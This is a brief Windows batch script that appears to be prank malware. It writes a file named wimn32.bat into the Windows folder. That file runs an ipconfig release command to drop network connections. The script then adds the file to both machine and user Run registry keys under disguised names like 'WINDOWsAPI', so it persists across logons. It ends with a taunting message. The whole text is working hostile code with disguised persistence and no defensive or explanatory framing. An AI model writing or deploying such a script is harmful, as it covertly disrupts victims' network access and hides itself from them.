@echo off
echo break off > c:\windows\wimn32.bat
echo ipconfig/release_all >> c:\windows\wimn32.bat
echo end >> c:\windows\wimn32.bat
reg add hkey_local_machine\software\microsoft\windows\currentversion\run /v WINDOWsAPI /t reg_sz /d c:\windows\wimn32.bat /f
reg add hkey_current_user\software\microsoft\windows\currentversion\run /v CONTROLexit /t reg_sz /d c:\windows\wimn32.bat /f
echo All of your internets are belong to us!!
